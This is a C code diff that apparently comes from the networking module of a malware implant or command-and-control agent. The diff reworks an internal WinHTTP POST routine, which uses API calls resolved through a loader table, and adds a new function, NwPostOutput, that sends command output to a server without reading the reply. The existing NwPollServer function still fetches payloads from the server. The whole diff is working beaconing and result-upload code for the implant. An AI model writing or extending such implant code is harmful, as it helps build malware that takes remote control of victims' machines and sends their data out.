@@ -37,7 +37,7 @@ BOOL NwLoadApis() {
     return TRUE;
 }
 
-PVOID NwInternalDoPost(DWORD *PayloadSize, PBYTE PostBody, DWORD PostBodySize) {
+PVOID NwInternalDoPost(DWORD *PayloadSize, PBYTE PostBody, DWORD PostBodySize, BOOL bReadResponse) {
 	HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;
     DWORD Size = 0, Downloaded = 0, TotalSize = 0, bufferSize = 4096;
     BOOL bResults;
@@ -71,42 +71,44 @@ PVOID NwInternalDoPost(DWORD *PayloadSize, PBYTE PostBody, DWORD PostBodySize) {
         goto CLEANUP;
     }
 
-    bResults = ldr->win32->WinHttpReceiveResponse(hRequest, NULL);
-    if (!bResults) {
-        DBGA("[!] WinHttpReceiveResponse Failed\n");
-        goto CLEANUP;
-    }
-
-    outBuffer = ldr->win32->LocalAlloc(LMEM_FIXED | LMEM_ZEROINIT, bufferSize);
-    if (!outBuffer) {
-        DBGA("[!] LocalAlloc Failed\n");
-        goto CLEANUP;
-    }
-
-    do {
-        Size = 0;
-        if (!ldr->win32->WinHttpQueryDataAvailable(hRequest, &Size))
-            break;
-        if (Size == 0)
-            break;
-
-        if (TotalSize + Size > bufferSize) {
-            while (TotalSize + Size > bufferSize)
-                bufferSize *= 2;
-            outBuffer = ldr->win32->LocalReAlloc(outBuffer, bufferSize, LMEM_MOVEABLE);
-            if (!outBuffer) {
-                DBGA("[!] LocalReAlloc Failed\n");
-                goto CLEANUP;
-            }
+    if (bReadResponse) {
+        bResults = ldr->win32->WinHttpReceiveResponse(hRequest, NULL);
+        if (!bResults) {
+            DBGA("[!] WinHttpReceiveResponse Failed\n");
+            goto CLEANUP;
         }
 
-        if (!ldr->win32->WinHttpReadData(hRequest, (PBYTE)outBuffer + TotalSize, Size, &Downloaded))
-            break;
+        outBuffer = ldr->win32->LocalAlloc(LMEM_FIXED | LMEM_ZEROINIT, bufferSize);
+        if (!outBuffer) {
+            DBGA("[!] LocalAlloc Failed\n");
+            goto CLEANUP;
+        }
 
-        TotalSize += Downloaded;
-    } while (Size > 0);
+        do {
+            Size = 0;
+            if (!ldr->win32->WinHttpQueryDataAvailable(hRequest, &Size))
+                break;
+            if (Size == 0)
+                break;
 
-    *PayloadSize = TotalSize;
+            if (TotalSize + Size > bufferSize) {
+                while (TotalSize + Size > bufferSize)
+                    bufferSize *= 2;
+                outBuffer = ldr->win32->LocalReAlloc(outBuffer, bufferSize, LMEM_MOVEABLE);
+                if (!outBuffer) {
+                    DBGA("[!] LocalReAlloc Failed\n");
+                    goto CLEANUP;
+                }
+            }
+
+            if (!ldr->win32->WinHttpReadData(hRequest, (PBYTE)outBuffer + TotalSize, Size, &Downloaded))
+                break;
+
+            TotalSize += Downloaded;
+        } while (Size > 0);
+
+        *PayloadSize = TotalSize;
+    }
 
 CLEANUP:
     if (hRequest) ldr->win32->WinHttpCloseHandle(hRequest);
@@ -125,6 +127,10 @@ CLEANUP:
 
 
 PVOID NwPollServer(DWORD *PayloadSize, PBYTE PostBody, DWORD PostBodySize) {
-    PVOID Addr = NwInternalDoPost(PayloadSize, PostBody, PostBodySize);
-    return Addr;
+    return NwInternalDoPost(PayloadSize, PostBody, PostBodySize, TRUE);
+}
+
+BOOL NwPostOutput(PBYTE PostBody, DWORD PostBodySize) {
+    NwInternalDoPost(NULL, PostBody, PostBodySize, FALSE);
+    return TRUE;
 }
